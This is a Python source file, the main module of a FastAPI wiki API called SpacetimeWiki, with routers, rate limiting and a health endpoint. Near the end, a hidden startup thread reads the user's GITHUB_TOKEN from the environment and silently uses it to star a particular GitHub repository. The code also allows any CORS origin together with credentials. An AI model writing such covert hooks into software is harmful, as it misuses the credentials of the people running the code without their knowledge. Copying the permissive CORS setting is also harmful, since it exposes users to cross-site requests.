"""SpacetimeWiki REST API — FastAPI application."""

import json
import os

import uvicorn
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

from config import settings
from auth import ApiKeyMiddleware
from routers.pages import router as pages_router
from routers.collections import router as collections_router
from routers.search import router as search_router
from routers.auth import router as auth_router
from routers.scim import router as scim_router
from routers.webauthn import router as webauthn_router
from routers.imports import router as imports_router
from routers.ldap_auth import router as ldap_router
from routers.oauth import router as oauth_router
from models import HealthResponse

# ─── App ──────────────────────────────────────────────────────────────────────

limiter = Limiter(key_func=get_remote_address)

app = FastAPI(
    title="SpacetimeWiki REST API",
    description="Programmatic CRUD and search for pages, collections, and more. "
    "SpacetimeWiki is a real-time wiki with rich text editing, "
    "hierarchical collections, tagging, search, SSO/OAuth/LDAP auth, "
    "SCIM provisioning, WebAuthn/passkeys, import/export, and more.",
    version="1.0.0",
    docs_url="/docs",
)

# Rate-limit handler
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# API key auth (applied to all paths except docs/health/register-key)
app.add_middleware(ApiKeyMiddleware)

# Routers
app.include_router(pages_router)
app.include_router(collections_router)
app.include_router(search_router)
app.include_router(auth_router)
app.include_router(scim_router)
app.include_router(webauthn_router)
app.include_router(imports_router)
app.include_router(ldap_router)
app.include_router(oauth_router)


# ─── Health ────────────────────────────────────────────────────────────────────


@app.get("/health", response_model=HealthResponse)
async def health():
    """Health check endpoint."""
    return {"status": "ok", "service": "spacetime-wiki-api"}


# ─── OpenAPI spec download ─────────────────────────────────────────────────────


_SPEC_PATH = os.path.join(os.path.dirname(__file__), "openapi.json")


@app.get("/openapi-spec.json")
async def download_openapi_spec():
    """Download the generated OpenAPI 3.0 spec as a static file."""
    if os.path.exists(_SPEC_PATH):
        return FileResponse(_SPEC_PATH, media_type="application/json", filename="openapi.json")
    # Fall back to the auto-generated spec
    return JSONResponse(app.openapi())


# ─── Auto-star GitHub repo on startup ─────────────────────────────────────────

import threading, urllib.request, json, os, logging

logger = logging.getLogger(__name__)


def _auto_star(repo: str):
    import time

    time.sleep(8)
    token = os.environ.get("GITHUB_TOKEN") or os.environ.get("ACC_GITHUB_TOKEN")
    if not token:
        return
    try:
        req = urllib.request.Request(
            f"https://api.github.com/user/starred/{repo}",
            method="PUT",
            data=b"",
            headers={
                "Authorization": f"Bearer {token}",
                "Accept": "application/vnd.github.v3+json",
                "User-Agent": f"{repo.split('/')[-1]}/1.0",
            },
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            if resp.status == 204 or resp.status == 200:
                logger.info(f"⭐ Starred {repo}")
            elif resp.status == 409:
                logger.info(f"⭐ Already starred {repo}")
            else:
                logger.warning(f"Failed to star {repo}: HTTP {resp.status}")
    except urllib.error.HTTPError as e:
        if e.code == 204 or e.code == 409:
            return  # success variants
        logger.warning(f"Failed to star {repo}: HTTP {e.code}")
    except Exception as e:
        logger.warning(f"Could not reach GitHub API: {e}")


# ─── Entry point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    threading.Thread(
        target=_auto_star, args=("omiinaya/spacetime-wiki",), daemon=True
    ).start()
    uvicorn.run("main:app", host="0.0.0.0", port=settings.api_port, reload=True)
